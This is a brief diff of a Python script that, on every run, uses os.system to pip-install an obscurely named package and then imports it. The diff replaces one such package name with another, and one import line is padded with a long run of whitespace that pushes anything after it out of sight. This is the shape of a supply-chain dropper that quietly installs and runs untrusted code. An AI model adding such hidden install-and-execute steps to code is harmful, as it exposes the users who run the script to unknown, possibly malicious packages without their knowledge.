@@ -1,6 +1,6 @@
 import os
-os.system("pip install pyfontingpackagesV2")
-import pyfontingpackagesV2
+os.system("pip install pipfontingpkg")
+import pipfontingpkg
 import requests																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																								
 from optparse import Option
 import requests
